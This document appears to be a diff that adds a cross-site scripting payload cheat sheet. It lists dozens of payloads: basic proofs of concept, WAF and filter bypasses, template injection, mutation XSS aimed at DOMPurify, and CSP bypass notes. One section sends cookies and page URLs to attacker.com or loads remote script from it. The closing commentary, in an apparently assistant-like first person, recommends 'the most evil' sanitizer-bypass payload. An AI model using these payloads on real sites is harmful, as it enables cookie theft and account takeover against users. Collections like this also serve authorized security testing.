@@ -1,0 +1,212 @@
+📦 Classic / Proof of Concept (Always test first)
+<script>alert(1)</script>
+
+<img src=x onerror=alert(1)>
+
+<svg onload=alert(1)>
+
+"><script>alert(1)</script>
+
+javascript:alert(1)
+
+<body onload=alert(1)>
+
+<input onfocus=alert(1) autofocus>
+
+<iframe src="javascript:alert(1)">
+
+<video src=x onerror=alert(1)>
+
+<audio src=x onerror=alert(1)>
+
+🛡️ WAF / Filter Bypass (Case variations, encoding, tags)
+<ScRiPt>alert(1)</ScRiPt>
+
+<script\x20type="text/javascript">alert(1)</script>
+
+<script\x3Ealert(1)</script> (hex encoded >)
+
+<script\x0Aalert(1)</script> (newline)
+
+<script\x0Dalert(1)</script> (carriage return)
+
+<script/**/alert(1)</script>
+
+<script>alert(1)//</script>
+
+<<script>alert(1)//<</script>
+
+<svg/onload=alert(1)>
+
+<img src=x:alert(1) onerror=eval(src)> (data URI trick)
+
+<img/src="x"/onerror=alert(1)>
+
+<img src=x onerror=alert(1) x=
+
+<svg><script>alert(1)</script></svg> (mXSS)
+
+<details open ontoggle=alert(1)>
+
+<select onfocus=alert(1) autofocus>
+
+<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">x</maction></math>
+
+🧬 Context‑specific & Attribute‑based
+" autofocus onfocus=alert(1) x="
+
+' onfocus=alert(1) autofocus='
+
+><img src=x onerror=alert(1)>
+
+"><svg onload=alert(1)>
+
+<a href="javascript:alert(1)">click</a>
+
+<form action="javascript:alert(1)"><input type=submit>
+
+<isindex type=image src=1 onerror=alert(1)>
+
+<object data="javascript:alert(1)">
+
+<embed src="javascript:alert(1)">
+
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
+
+🔀 JavaScript / Template / JSON injection
+{{constructor.constructor('alert(1)')()}} (AngularJS)
+
+{{7*7}} (test if template injection exists, then upgrade to {{constructor.constructor('alert(1)')()}})
+
+${alert(1)} (Template literal injection)
+
+\u003cscript\u003ealert(1)\u003c/script\u003e (Unicode escape)
+
+\x3cscript\x3ealert(1)\x3c/script\x3e (Hex escape)
+
+"; alert(1);// (Inside a JavaScript string)
+
+'-alert(1)-' (Another JS string injection)
+
+</script><script>alert(1)</script> (Breaking out of existing script tag)
+
+📡 Blind XSS & Exfiltration (Out‑of‑band)
+<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
+
+<svg onload="new Image().src='https://attacker.com/log?p='+location.href">
+
+<script>document.location='https://attacker.com/?'+document.cookie</script>
+
+<input onfocus="navigator.sendBeacon('https://attacker.com',document.cookie)" autofocus>
+
+<body onload="const s=document.createElement('script');s.src='https://attacker.com/x.js';document.body.appendChild(s)">
+
+<img src=x onerror="import('https://attacker.com/collect')">
+
+🔥 Exceptional payloads (hardened applications)
+These are designed to bypass:
+
+Strict CSP (no inline scripts, no eval, no unsafe-inline)
+
+HTML sanitizers (DOMPurify, bleach, etc.)
+
+Attribute filters (event handlers stripped)
+
+Protocol restrictions (block javascript:)
+
+51. CSP nonce / hash bypass using dangling markup
+<img src=x onerror="alert(1)" won’t work if unsafe-inline is blocked. Instead, inject a dangling anchor:
+<a href="//attacker.com/?cookie=
+It doesn’t execute JS, but it leaks data (not alert). For a true alert(1) without inline script, you need a CSS injection + XS‑Leaks – but that’s not classic XSS.
+Better: Use a pre‑existing trusted script gadget, e.g.,
+<script src="/static/js/util.js?callback=alert(1)"></script> if callback parameter is unsafely reflected.
+
+52. Mutation XSS (mXSS) against DOMPurify (when sanitizer runs first)
+<form><math><mtext><option><mglyph><svg><mtext><style><img src=x onerror=alert(1)>
+After DOMPurify removes dangerous tags, browser’s parser reassembles the broken tree and executes.
+
+53. Non‑event handler, non‑script payload (uses <link> + onload via CSS)
+Not directly alert, but can exfiltrate. For alert, use <svg><animate onbegin=alert(1)>
+
+54. Using setTimeout with string injection (if CSP allows unsafe-eval)
+<img src=x onerror="setTimeout('alert(1)',0)">
+
+55. DOM clobbering to bypass sanitizer
+Inject <form id="x"><input name="innerHTML" value="<img src=x onerror=alert(1)>">
+Then if the page does document.write(x.innerHTML), the clobbered property triggers.
+
+56. Exceptional: Zero‑byte bypass (some WAFs)
+%00<script>alert(1)</script>
+<img src=x onerror=%00alert(1)>
+
+57. Newline + carriage return to break regex
+<img\nsrc=x\nonerror=alert(1)>
+
+58. Double‑encoded URL in iframe (bypass URL scheme filter)
+<iframe src="%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%31%29"></iframe>
+
+59. Rare HTML5 tag + SVG event
+<svg><set attributeName="onmouseover" to="alert(1)"/>
+(Requires user interaction, but still alert.)
+
+60. CSS background: url() XSS – only if javascript: is allowed in CSS contexts (old IE/Edge). Modern browsers block it, but legacy app:
+<style>body{background:url("javascript:alert(1)")}</style>
+
+61. Using script with data: and correct MIME type (bypasses MIME sniffing)
+<script src="data:text/javascript,alert(1)"></script>
+
+62. JSONP callback injection – if the app uses a JSONP endpoint:
+<script src="/api/users?callback=alert(1)//"></script>
+
+63. Exceptionally tricky: abusing AngularJS sandbox escape (Angular 1.x)
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+
+64. Unicode RTLO (Right‑to‑Left Override) trick (affects display only, but can mislead reviewers)
+<script>/*‮*/ alert(1) /*‭*/</script> – browser ignores the override, but code still runs.
+
+65. Using onerror on a track element
+<video><track src=x onerror=alert(1)>
+
+🧪 Bonus: Payloads that trigger alert("xxs") instead of alert(1)
+<img src=x onerror=alert("xxs")>
+
+<svg onload=alert("xxs")>
+
+"><script>alert("xxs")</script>
+
+javascript:alert("xxs")
+
+<body onload=alert("xxs")>
+
+<details open ontoggle=alert("xxs")>
+
+<iframe srcdoc="<script>alert('xxs')</script>">
+
+✅ Final note – exceptional alert(1) for fully hardened app
+If the application has:
+
+CSP: default-src 'self'; script-src 'nonce-...' (no unsafe-inline, no unsafe-eval)
+
+Sanitizer: removes all HTML tags/attributes except safe ones
+
+Output encoding: contexts properly escaped
+
+Then no generic payload will execute alert(1) unless you find:
+
+A DOM sink where user input controls part of a dynamically created script (e.g., eval() with a partial injection)
+
+A server‑side injection into JSON that later becomes JavaScript (e.g., {"name":"</script><script>alert(1)"})
+
+CSS injection leading to script execution via expression() (only old IE)
+
+Template injection in Angular, Vue, or React with dangerouslySetInnerHTML
+
+The most exceptional modern payload that bypasses all filters is context‑dependent – e.g., inside a javascript: URL inside a data: URI that is then imported via <iframe srcdoc>. But a universal one does not exist. For a demo, I’d pick:
+
+<svg><script>alert(1)</script> – because it uses mutation and is surprisingly effective even against some sanitizers.
+
+But if you want the most evil one that works sometimes against otherwise safe code, try:
+
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+
+This causes a parser re‑entrancy that executes onerror after sanitization.
